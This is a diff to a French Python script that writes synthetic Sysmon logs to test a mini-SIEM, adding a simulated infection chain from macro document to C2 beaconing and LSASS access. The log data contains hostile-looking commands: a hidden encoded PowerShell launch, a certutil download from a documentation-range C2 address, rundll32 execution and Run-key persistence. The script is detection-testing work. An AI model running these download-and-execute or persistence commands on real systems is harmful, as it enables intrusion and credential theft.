@@ -2,10 +2,12 @@
 """Générateur de logs SYNTHÉTIQUES pour tester le mini-SIEM.
 
 Ce script n'attaque rien : il écrit de fausses lignes de log dans des fichiers,
-afin de fournir un jeu de données reproductible. Il produit trois sources :
-  - auth.log   (SSH / sudo)      : brute force, brute force réussi, escalade sudo
-  - access.log (Apache combined) : scan web + injection SQL
-  - ufw.log    (pare-feu)        : scan de ports
+afin de fournir un jeu de données reproductible. Il produit cinq sources :
+  - auth.log           (SSH / sudo)      : brute force, brute force réussi, escalade sudo
+  - access.log         (Apache combined) : scan web + injection SQL
+  - ufw.log            (pare-feu)        : scan de ports
+  - windows_events.xml (journal Sécurité): brute force, persistance, journal effacé
+  - sysmon_events.xml  (Sysmon)          : document piégé -> PowerShell -> C2 -> LSASS
 Chaque scénario est conçu pour déclencher une règle, plus du trafic normal.
 
 Usage :
@@ -14,9 +16,11 @@ Usage :
 from __future__ import annotations
 
 import argparse
+import base64
 import random
 from datetime import datetime, timedelta
 from pathlib import Path
+from xml.sax.saxutils import escape
 
 MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
           "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
@@ -196,6 +200,151 @@ def gen_evtx(rnd: random.Random) -> list[tuple[datetime, str]]:
     return out
 
 
+# --------------------------------------------------------------------------
+# Sysmon : un poste de travail, une journée normale, puis une chaîne d'infection
+SYSMON_GUID = "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+PC = "PC-COMPTA01.corp.local"
+USER, ADMIN, SYSTEM = r"CORP\mmartin", r"CORP\it-admin", r"NT AUTHORITY\SYSTEM"
+EXPLORER = r"C:\Windows\explorer.exe"
+CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
+OFFICE = r"C:\Program Files\Microsoft Office\root\Office16"
+WINWORD, EXCEL, OUTLOOK = OFFICE + r"\WINWORD.EXE", OFFICE + r"\EXCEL.EXE", OFFICE + r"\OUTLOOK.EXE"
+SYS32 = r"C:\Windows\System32"
+POWERSHELL = SYS32 + r"\WindowsPowerShell\v1.0\powershell.exe"
+CMD, CERTUTIL, RUNDLL32 = SYS32 + r"\cmd.exe", SYS32 + r"\certutil.exe", SYS32 + r"\rundll32.exe"
+SVCHOST, TASKMGR, LSASS = SYS32 + r"\svchost.exe", SYS32 + r"\Taskmgr.exe", SYS32 + r"\lsass.exe"
+SPLWOW = r"C:\Windows\splwow64.exe"
+MSMPENG = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"
+HKU = r"HKU\S-1-5-21-3623811015-3361044348-30300820-1104"
+C2 = "203.0.113.200"   # même IP C2 que dans auth.log : la CTI fait le lien
+
+
+def _sysmon(dt: datetime, eid: int, record: int, data: dict) -> str:
+    fields = "".join(f'<Data Name="{k}">{escape(str(v), {chr(34): "&quot;"})}</Data>'
+                     for k, v in data.items())
+    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
+            f'<System><Provider Name="Microsoft-Windows-Sysmon" Guid="{SYSMON_GUID}"/>'
+            f'<EventID>{eid}</EventID>'
+            f'<TimeCreated SystemTime="{dt:%Y-%m-%dT%H:%M:%S}.{dt.microsecond:06d}0Z"/>'
+            f'<EventRecordID>{record}</EventRecordID>'
+            f'<Channel>Microsoft-Windows-Sysmon/Operational</Channel>'
+            f'<Computer>{PC}</Computer></System>'
+            f'<EventData>{fields}</EventData></Event>')
+
+
+def gen_sysmon(rnd: random.Random) -> list[tuple[datetime, str]]:
+    raw: list[tuple[datetime, int, dict]] = []
+    day = datetime(2026, 11, 8)
+    pids: dict[str, int] = {}
+
+    def pid(image: str) -> int:
+        return pids.setdefault(image, rnd.randint(1000, 9999))
+
+    def at(h, m, s=0):
+        return day.replace(hour=h, minute=m, second=s,
+                           microsecond=rnd.randint(0, 999) * 1000)
+
+    def base(dt, image, user):
+        return {"RuleName": "-", "UtcTime": f"{dt:%Y-%m-%d %H:%M:%S}.{dt.microsecond // 1000:03d}",
+                "ProcessId": pid(image), "Image": image, "User": user}
+
+    def proc(dt, image, cmdline, parent, user=USER, integrity="Medium"):
+        d = base(dt, image, user)
+        d.update({"CommandLine": cmdline, "CurrentDirectory": r"C:\Users\mmartin" + "\\",
+                  "IntegrityLevel": integrity, "ParentProcessId": pid(parent),
+                  "ParentImage": parent})
+        raw.append((dt, 1, d))
+
+    def net(dt, image, dst, port, host="", user=USER):
+        d = base(dt, image, user)
+        d.update({"Protocol": "tcp", "Initiated": "true", "SourceIp": "10.0.20.15",
+                  "SourcePort": rnd.randint(49152, 65535), "DestinationIp": dst,
+                  "DestinationHostname": host, "DestinationPort": port})
+        raw.append((dt, 3, d))
+
+    def access(dt, image, granted, user=USER):
+        d = {"RuleName": "-", "UtcTime": base(dt, image, user)["UtcTime"],
+             "SourceProcessId": pid(image), "SourceImage": image,
+             "TargetProcessId": pid(LSASS), "TargetImage": LSASS,
+             "GrantedAccess": granted, "SourceUser": user, "TargetUser": SYSTEM}
+        raw.append((dt, 10, d))
+
+    def file(dt, image, path, user=USER):
+        d = base(dt, image, user)
+        d["TargetFilename"] = path
+        raw.append((dt, 11, d))
+
+    def reg(dt, image, key, value, user=USER):
+        d = base(dt, image, user)
+        d.update({"EventType": "SetValue", "TargetObject": key, "Details": value})
+        raw.append((dt, 13, d))
+
+    def dns(dt, image, name, result, user=USER):
+        d = base(dt, image, user)
+        d.update({"QueryName": name, "QueryStatus": "0", "QueryResults": result})
+        raw.append((dt, 22, d))
+
+    # --- Journée normale : navigation, messagerie, bureautique, administration
+    proc(at(8, 31, 5), CHROME, f'"{CHROME}"', EXPLORER)
+    dns(at(8, 31, 9), CHROME, "intranet.example.com", "::ffff:192.0.2.10;")
+    proc(at(8, 33, 40), OUTLOOK, f'"{OUTLOOK}"', EXPLORER)
+    dns(at(8, 33, 44), OUTLOOK, "mail.example.org", "::ffff:192.0.2.25;")
+    t = at(8, 35)
+    for _ in range(12):
+        t += timedelta(seconds=rnd.randint(300, 1500))
+        image, dst = rnd.choice([(CHROME, "192.0.2.10"), (CHROME, "192.0.2.11"),
+                                 (OUTLOOK, "192.0.2.25")])
+        net(t, image, dst, 443)
+    proc(at(9, 10, 12), WINWORD,
+         f'"{WINWORD}" /n "C:\\Users\\mmartin\\Documents\\budget_2027.docx"', EXPLORER)
+    proc(at(9, 52, 30), SPLWOW, f"{SPLWOW} 12288", WINWORD)          # impression
+    proc(at(9, 40, 2), EXCEL,
+         f'"{EXCEL}" "C:\\Users\\mmartin\\Documents\\rapprochement_bancaire.xlsx"', EXPLORER)
+    reg(at(9, 40, 3), EXPLORER,
+        HKU + r"\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.xlsx\MRUListEx",
+        "Binary Data")
+    proc(at(10, 0, 1), POWERSHELL,                                    # tâche planifiée légitime
+         f"{POWERSHELL} -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventaire.ps1",
+         SVCHOST, user=SYSTEM, integrity="System")
+    proc(at(10, 15, 20), CERTUTIL,                                    # contrôle d'empreinte
+         f"{CERTUTIL} -hashfile C:\\Users\\it-admin\\Downloads\\setup.msi SHA256",
+         CMD, user=ADMIN, integrity="High")
+    file(at(10, 48, 7), CHROME, r"C:\Users\mmartin\Downloads\releve_octobre.pdf")
+    access(at(11, 2, 40), MSMPENG, "0x1410", user=SYSTEM)             # antivirus : filtré
+    access(at(11, 20, 15), TASKMGR, "0x1000")                          # droits de lecture seuls
+
+    # --- Chaîne d'infection : pièce jointe piégée -> macro -> PowerShell -> C2
+    file(at(14, 2, 11), CHROME, r"C:\Users\mmartin\Downloads\facture_2026-118.docm")
+    proc(at(14, 5, 10), WINWORD,
+         f'"{WINWORD}" /n "C:\\Users\\mmartin\\Downloads\\facture_2026-118.docm"', EXPLORER)
+    # Charge encodée FACTICE (données synthétiques) : décodée, elle ne fait que
+    # décrire l'étape suivante, vers une IP de documentation (RFC 5737).
+    script = ("# mini-SIEM : donnees synthetiques\n"
+              f"Start-Process certutil.exe -ArgumentList '-urlcache -split -f "
+              f"http://{C2}/stage2.txt %TEMP%\\upd.dll'")
+    enc = base64.b64encode(script.encode("utf-16-le")).decode()
+    proc(at(14, 5, 31), POWERSHELL, f"powershell.exe -nop -w hidden -enc {enc}", WINWORD)
+    dns(at(14, 5, 48), POWERSHELL, "cdn-update.example.net", f"::ffff:{C2};")
+    proc(at(14, 5, 49), CERTUTIL,
+         f"certutil.exe -urlcache -split -f http://{C2}/stage2.txt "
+         r"C:\Users\mmartin\AppData\Local\Temp\upd.dll", POWERSHELL)
+    net(at(14, 5, 50), CERTUTIL, C2, 80)
+    file(at(14, 5, 52), CERTUTIL, r"C:\Users\mmartin\AppData\Local\Temp\upd.dll")
+    proc(at(14, 6, 5), RUNDLL32,
+         r"rundll32.exe C:\Users\mmartin\AppData\Local\Temp\upd.dll,Start", POWERSHELL)
+    t = at(14, 6, 7)
+    for _ in range(5):                                                 # balise vers le C2
+        net(t, RUNDLL32, C2, 443)
+        t += timedelta(seconds=60 + rnd.randint(-3, 3))
+    reg(at(14, 7, 30), RUNDLL32,
+        HKU + r"\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate",
+        r"rundll32.exe C:\Users\mmartin\AppData\Local\Temp\upd.dll,Start")
+    access(at(14, 9, 12), RUNDLL32, "0x1010")                          # vol d'identifiants
+
+    raw.sort(key=lambda x: x[0])
+    return [(dt, _sysmon(dt, eid, 52000 + i, data)) for i, (dt, eid, data) in enumerate(raw)]
+
+
 def main() -> int:
     p = argparse.ArgumentParser(description="Génère des logs synthétiques.")
     p.add_argument("--outdir", default="samples")
@@ -218,6 +367,11 @@ def main() -> int:
     (outdir / "windows_events.xml").write_text(
         "\n".join(x for _, x in evtx) + "\n", encoding="utf-8")
     print(f"[+] {len(evtx):3d} événements -> {outdir / 'windows_events.xml'}")
+
+    sysmon = gen_sysmon(rnd)
+    (outdir / "sysmon_events.xml").write_text(
+        "\n".join(x for _, x in sysmon) + "\n", encoding="utf-8")
+    print(f"[+] {len(sysmon):3d} événements -> {outdir / 'sysmon_events.xml'}")
     return 0
 
 
